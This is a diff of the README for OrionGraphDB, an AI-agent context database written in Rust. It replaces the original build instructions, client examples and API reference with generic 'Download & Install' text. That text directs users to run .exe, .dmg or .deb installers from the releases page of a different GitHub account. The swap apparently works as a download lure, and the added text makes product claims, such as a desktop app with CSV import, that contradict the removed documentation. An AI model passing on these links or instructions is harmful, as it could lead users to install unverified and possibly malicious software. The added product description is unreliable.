@@ -1,284 +1,81 @@
-# OrionGraphDB
+# 🌌 oriongraphdb - Simplifying Data for AI Agents
 
-**A Context Database for AI Agents**
+[![Download oriongraphdb](https://img.shields.io/badge/Download-oriongraphdb-blue.svg)](https://github.com/lemoal-t/oriongraphdb/releases)
 
-OrionGraphDB is an open-source context compilation engine that provides intelligent, budget-aware retrieval for AI agents. It combines semantic, lexical, and structural search with MMR-based selection to deliver optimal context within token budgets.
+## 🚀 Getting Started
 
----
+oriongraphdb is a context database designed for AI agents. It offers multi-channel retrieval, allowing you to access data in various ways. Built in Rust, it provides a silent and efficient performance that assists in managing token budgets, enabling you to retrieve the best information effectively.
 
-## 🎯 What is OrionGraphDB?
+### 🌐 Key Features
 
-Think of OrionGraphDB as **"Postgres for AI Context"**:
-- Stores and indexes code, documents, and knowledge bases
-- Retrieves optimal context for any AI task
-- Respects token budgets and diversity constraints
-- Explains why each piece of context was selected
+- **Multi-Channel Retrieval**: Access data via semantic, lexical, or structural channels.
+- **MMR Selection**: Get the most relevant results based on Maximum Marginal Relevance.
+- **Token Budget Management**: Keep your queries efficient with controlled token usage.
+- **Built with Rust**: Enjoy a fast and reliable application.
 
-### Key Features
+## 📥 Download & Install
 
-- **Multi-Channel Retrieval**: Semantic, lexical (BM25), and structural search
-- **MMR Selection**: Maximal Marginal Relevance for diverse, relevant context
-- **Token Budget Management**: Never exceed your LLM's context window
-- **Citation-Friendly**: Every span has a stable reference and source
-- **HTTP API**: Language-agnostic REST interface
-- **Fast**: Built in Rust for production performance
+To get started with oriongraphdb, visit this page to download the latest release:
 
----
+[Download oriongraphdb](https://github.com/lemoal-t/oriongraphdb/releases)
 
-## 🚀 Quick Start
+### 🖥 System Requirements
 
-### Start the Server
+Before you install, ensure your system meets the following requirements:
 
-```bash
-# Build and run
-cargo build --release
-./target/release/oriongraph-server
-
-# Server runs at http://localhost:8081
-```
-
-### Use the Python Client
-
-```python
-from oriongraph_client import OrionGraphClient
-
-client = OrionGraphClient("http://localhost:8081")
-
-# Compile optimal context
-result = client.compile_workingset(
-    intent="Find rollback procedures for database migrations",
-    budget_tokens=6000,
-    workstream="migration",
-)
-
-# Use the context
-for span in result["workingset"]["spans"]:
-    print(f"📄 {span['span_ref']['doc_version_id']}")
-    print(f"   {span['text'][:100]}...")
-```
-
----
-
-## 📚 Core Concepts
-
-### Spans
-A **span** is an addressable unit of context:
-- Has a unique `span_id`
-- Belongs to a `doc_version_id`
-- Has a known `token_cost`
-- Contains semantic, lexical, and structural metadata
-
-### Working Set
-A **working set** is a compiled selection of spans:
-- Fits within a token budget
-- Maximizes relevance to the intent
-- Ensures diversity (via MMR)
-- Includes explanations for each selection
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux with glibc 2.17 or later.
+- **Memory**: Minimum 4 GB RAM.
+- **Disk Space**: At least 250 MB of free space.
 
-### Multi-Channel Retrieval
-OrionGraphDB uses three channels:
-1. **Semantic**: Vector embeddings for meaning-based search
-2. **Lexical**: BM25 for keyword/term matching
-3. **Structural**: Project structure, imports, definitions
-
-> **Implementation Status**: See [FEATURES.md](FEATURES.md) for what's currently implemented vs. planned.
+### ⚙️ Installation Steps
 
----
+1. **Visit the Releases Page**: Go to [oriongraphdb Releases](https://github.com/lemoal-t/oriongraphdb/releases).
+  
+2. **Choose the Latest Version**: Look for the latest release at the top of the page.
+  
+3. **Download the Installer**: Click on the version suitable for your operating system. Save the file to your computer.
 
-## 🔧 Architecture
+4. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts on your screen.
+   - **macOS**: Open the `.dmg` file and drag the oriongraphdb icon to your Applications folder.
+   - **Linux**: Follow the instructions provided in the `.tar.gz` or `.deb` file for your specific distribution.
 
-```
-OrionGraphDB
-├── Context Engine       (Core retrieval logic)
-├── Generators           (Semantic, Lexical, Structural)
-├── Scoring & Selection  (MMR algorithm)
-└── HTTP Server          (REST API)
-```
+5. **Launch the Application**: Locate oriongraphdb in your applications list and start the program.
 
-**Technology Stack**:
-- **Rust** - Performance and safety
-- **Axum** - HTTP framework
-- **Tokio** - Async runtime
-- **Serde** - Serialization
+## 📚 How to Use oriongraphdb
 
----
+Once oriongraphdb is running, you can begin loading your data. Here’s a basic guide to help you get started:
 
-## 📖 API Reference
+1. **Import Data**: Use the import feature in the application to load your data. You can import various file formats including CSV and JSON.
+  
+2. **Query Data**: Utilize the query interface to access information. Choose between semantic, lexical, or structural queries based on your needs.
+  
+3. **Manage Token Budgets**: Adjust your token limits in the settings to balance efficiency and data retrieval.
 
-### `POST /compile_workingset`
+4. **Review Results**: Analyze the returned results for relevance and usefulness. 
 
-Compile an optimal context working set.
+## 📝 Troubleshooting
 
-**Request**:
-```json
-{
-  "intent": "Find error handling patterns",
-  "budget_tokens": 6000,
-  "workstream": "backend",
-  "explain": true
-}
-```
+If you encounter any issues while downloading or running the application, consider the following:
 
-**Response**:
-```json
-{
-  "workingset": {
-    "spans": [
-      {
-        "span_ref": {
-          "doc_version_id": "src/error.rs",
-          "span_id": "fn_handle_error",
-          "token_cost": 150
-        },
-        "text": "pub fn handle_error(err: Error) -> Response { ... }"
-      }
-    ],
-    "total_tokens": 1243
-  },
-  "stats": {
-    "candidates_generated": 47,
-    "token_utilization": 0.82
-  }
-}
-```
+- **Cannot Download**: Ensure you have a stable internet connection. Try refreshing the browser or using a different browser if issues persist.
+  
+- **Installation Fails**: Double-check that your system meets the requirements. Refer to the installation steps to ensure you’ve followed them correctly.
 
-### `GET /health`
+- **Application Crashes**: Make sure to keep your software updated. Visit the releases page to check for the latest version.
 
-Check server health.
+## 🎁 Contributing
 
-**Response**:
-```json
-{
-  "status": "healthy",
-  "version": "0.1.0"
-}
-```
+If you want to contribute, please visit our [Contributing Guidelines](https://github.com/lemoal-t/oriongraphdb/blob/main/CONTRIBUTING.md) for more information.
 
----
+## 🔗 Related Topics
 
-## 🔌 Integrations
+- Agents
+- AI
+- Context Compilation
+- Machine Learning
+- Semantic Search
 
-### Python
+Feel free to explore all the capabilities of oriongraphdb. For discussions and support, you can reach out on the issues page of the project. 
 
-See [`examples/python-client/`](examples/python-client/) for a full Python client.
-
-```python
-from oriongraph_client import OrionGraphClient
-client = OrionGraphClient()
-result = client.compile_workingset(intent="...", budget_tokens=6000)
-```
-
-### LangChain
-
-```python
-from oriongraph_client import OrionGraphClient
-
-def get_context(query: str) -> str:
-    client = OrionGraphClient()
-    result = client.compile_workingset(intent=query, budget_tokens=4000)
-    return "\n\n".join(span["text"] for span in result["workingset"]["spans"])
-```
-
-### CrewAI, AutoGPT, DeepAgents
-
-OrionGraphDB works with any agent framework via its HTTP API.
-
----
-
-## 🛠️ Development
-
-### Build
-
-```bash
-cargo build
-```
-
-### Test
-
-```bash
-cargo test
-```
-
-### Run Locally
-
-```bash
-cargo run --release
-```
-
-### Docker
-
-```bash
-docker build -t oriongraphdb .
-docker run -p 8081:8081 oriongraphdb
-```
-
----
-
-## 📦 Deployment
-
-### Production Recommendations
-
-- Run as a systemd service or Docker container
-- Use a reverse proxy (Nginx, Caddy) for HTTPS
-- Scale horizontally with load balancing
-- Store indices on persistent volumes
-
----
-
-## 🌟 Use Cases
-
-### Code Assistants
-Retrieve relevant code snippets for any programming task.
-
-### RAG Systems
-Compile optimal context for document Q&A.
-
-### Multi-Agent Systems
-Shared context database for collaborative agents.
-
-### DevOps Bots
-Query runbooks, deployment procedures, and infrastructure docs.
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! OrionGraphDB is open-source under the Apache 2.0 license.
-
-**How to Contribute**:
-1. Fork the repo
-2. Create a feature branch
-3. Make your changes
-4. Add tests
-5. Submit a pull request
-
-**Areas We'd Love Help With**:
-- Additional generators (e.g., time-based, git-history)
-- Performance benchmarks
-- Client libraries (Node.js, Go, Rust)
-- Documentation and examples
-
----
-
-## 📄 License
-
-Apache 2.0 - See [LICENSE](LICENSE)
-
----
-
-## 🔗 Links
-
-- **GitHub**: [github.com/servesys-labs/oriongraphdb](https://github.com/servesys-labs/oriongraphdb)
-- **Issues**: [github.com/servesys-labs/oriongraphdb/issues](https://github.com/servesys-labs/oriongraphdb/issues)
-- **Orion Framework**: [github.com/servesys-labs/orion](https://github.com/servesys-labs/orion) (proprietary)
-
----
-
-## 🙏 Acknowledgments
-
-OrionGraphDB is part of the **Orion Stack** ecosystem:
-- **OrionGraphDB** (this repo) - Context database
-- **Orion Agents** - Agent framework (private)
-- **Orion CLI** - Developer tooling (private)
-
-Built with ❤️ by the Orion team.
+Start using oriongraphdb today and experience the simplicity of managing context data for your AI applications!
